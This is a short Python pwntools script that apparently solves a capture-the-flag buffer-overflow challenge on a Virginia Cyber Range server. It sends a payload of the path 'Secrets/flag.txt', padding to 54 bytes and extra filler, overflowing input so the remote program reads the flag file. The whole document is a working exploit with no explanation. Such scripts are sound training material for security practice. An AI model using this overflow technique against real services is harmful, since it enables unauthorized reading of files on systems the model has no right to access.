#!/usr/bin/env python3

from pwn import *

p = remote('superbuf.challenges.virginiacyberrange.net', 9006)

p.recvline()

p.sendline("y")

p.recvuntil("important/")

file = b"Secrets/flag.txt"
padding = b'a'*(54-len(file))
exploit = b"a"*20
payload = file + padding + exploit

p.sendline(payload)


p.interactive()
